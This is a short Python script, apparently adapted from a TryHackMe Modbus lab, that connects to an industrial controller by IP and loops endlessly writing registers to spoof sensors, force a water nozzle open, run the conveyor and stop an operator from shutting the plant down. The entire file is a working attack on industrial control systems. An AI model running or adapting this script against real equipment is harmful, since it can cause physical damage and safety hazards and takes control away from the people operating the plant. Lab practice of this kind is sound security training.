#!/usr/bin/env python3

# Modified version of the TryHackMe Modbus attack_move_fill2.py file
# This version uses pymodbus 3.2 instead of 1.52

import sys
import time
from pymodbus.client import ModbusTcpClient

if len(sys.argv) != 2:
    print("Error: Incorrect arguments given")
    print("Usage: ./attack_move_fill2.py ip_address")
    sys.exit()

ip = sys.argv[1]

client = ModbusTcpClient(ip, port=502)
client.connect()

print('Force start plant')

while True:
    client.write_register(1, 0) # Keep water sensor off (water keeps flowing)
    client.write_register(2, 0) # Keep botte sensor on (system thinks a bottle is under the nozzle)
    client.write_register(3, 1) # Start the conveyor belt motor
    client.write_register(4, 1) # Open the nozzle
    client.write_register(16, 1) # Start the plant & prevent manager from shutting it off
